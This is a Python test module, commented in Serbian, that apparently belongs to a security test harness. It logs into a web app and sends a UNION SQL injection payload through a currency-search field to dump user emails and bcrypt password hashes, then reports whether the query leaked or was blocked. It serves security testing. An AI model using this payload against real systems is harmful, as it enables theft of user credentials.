
#SQL injection UZIVO preko HTTP-a (daljinski napad, bez pristupa serveru).


import os

try:
    import requests
except ImportError:
    requests = None

NAME = "SQL injection — pretraga valuta (A05)"
DESCRIPTION = "Daljinski napad preko HTTP-a: UNION injekcija kroz polje za pretragu valuta."

EMAIL = os.environ.get("APP_TEST_EMAIL") or os.environ.get("CSRF_TEST_EMAIL") or ""
LOZINKA = os.environ.get("APP_TEST_PASSWORD") or os.environ.get("CSRF_TEST_PASSWORD") or ""
EMAIL = EMAIL.strip()

#UNION payload: 2 kolone da se poklopi sa "SELECT symbol, name".
#Trailing '--' zakomentarise ostatak originalnog WHERE-a.
PAYLOAD = "' UNION SELECT email, lozinka FROM korisnici -- "


def _izgleda_kao_hash(vrednost):
    return isinstance(vrednost, str) and vrednost.startswith("$2")


def _maskiraj_email(e):
    if isinstance(e, str) and "@" in e:
        ime = e.split("@")[0]
        return (ime[:3] + "***@***")
    return e


def run(ctx):
    if requests is None:
        ctx.info("Biblioteka 'requests' nije instalirana (pip install requests).")
        ctx.log(ctx.summary())
        return
    if not EMAIL or not LOZINKA:
        ctx.info("APP_TEST_EMAIL / APP_TEST_PASSWORD nisu postavljeni -> preskacem.")
        ctx.log('  $env:APP_TEST_EMAIL = "test@test.com"')
        ctx.log('  $env:APP_TEST_PASSWORD = "Test1234"')
        ctx.log(ctx.summary())
        return

    baza = ctx.target.rstrip("/")
    s = requests.Session()
    ctx.log(f"Prijava: {EMAIL}  @ {baza}")
    try:
        r = s.post(baza + "/api/auth/login", json={"email": EMAIL, "lozinka": LOZINKA}, timeout=5)
    except requests.RequestException as e:
        ctx.info(f"Aplikacija ne odgovara: {e}")
        ctx.log(ctx.summary())
        return
    if r.status_code != 200:
        ctx.info(f"Prijava nije uspela (HTTP {r.status_code}). Proveri kredencijale/instancu.")
        ctx.log(ctx.summary())
        return
    ctx.log("  prijava OK.")
    ctx.log("")

    #--- (A) normalna pretraga ---
    ctx.log("A) Normalna pretraga  q=bit")
    try:
        normal = s.get(baza + "/api/coins/search", params={"q": "bit"}, timeout=5).json()
    except Exception as e:
        ctx.info(f"Pretraga ne radi: {e}")
        ctx.log(ctx.summary())
        return
    ctx.log(f"   -> {[x.get('name') for x in normal[:3]]}")
    ctx.log("")

    #--- (B) SQL injection: UNION cita tabelu korisnika ---
    ctx.log("B) Injekcija  q=' UNION SELECT email, lozinka FROM korisnici --")
    try:
        d = s.get(baza + "/api/coins/search", params={"q": PAYLOAD}, timeout=5).json()
    except Exception as e:
        ctx.info(f"Napad nije prosao kao JSON: {e}")
        ctx.log(ctx.summary())
        return

    #procureli redovi: 'symbol' je email, 'name' je bcrypt hash
    procureli = [x for x in d if isinstance(x, dict)
                 and (_izgleda_kao_hash(x.get("name")) or "@" in str(x.get("symbol")))]
    if procureli:
        ctx.exposed(f"Procurelo {len(procureli)} naloga (email + bcrypt hash):")
        for x in procureli[:6]:
            ctx.log(f"   {_maskiraj_email(x.get('symbol'))}  ->  {str(x.get('name'))[:24]}...")
    else:
        ctx.blocked("UNION ne vraca korisnike -> upit je parametrizovan.")

    ctx.log("")
    ctx.log(ctx.summary())
